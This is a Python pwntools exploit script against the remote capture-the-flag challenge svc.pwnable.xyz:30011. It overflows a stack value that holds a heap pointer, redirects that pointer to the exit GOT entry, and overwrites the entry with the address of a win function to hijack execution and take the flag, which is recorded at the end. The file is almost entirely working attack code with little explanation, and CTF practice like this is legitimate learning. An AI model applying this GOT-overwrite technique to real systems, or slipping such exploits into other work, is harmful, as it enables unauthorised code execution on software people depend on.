from pwn import *

#r = process('./challenge')
r = remote("svc.pwnable.xyz" , 30011)

r.sendlineafter("> ", "1")

r.sendlineafter(": ", "a")
r.sendlineafter(": ", "1")
""" gdb.attach(r) """
r.sendlineafter("> ", "3")
r.sendlineafter(": ", "b")

exit_got = 0x00602070
printf_got = 0x00602030
win = 0x00400b71
r.sendlineafter(": ", b"A" * 0x10 + p64(exit_got)) # overflow the value on the stack which represents the malloc pointer 
""" r.sendlineafter(": ", b"A" * 0x10 + p64(printf_got)) # overflow the value on the stack which represents the malloc pointer  """
""" r.sendlineafter(": ", "A" * 0x10 + "B" * 4) """
""" gdb.attach(r) """
r.sendafter("> ", "3")
r.sendafter(": ", p64(win))
""" gdb.attach(r) """
l = r.sendlineafter(": ", "c")
""" gdb.attach(r) """
l = r.interactive()

# flag: FLAG{uninitializ3d_variabl3_ch3ck3d}
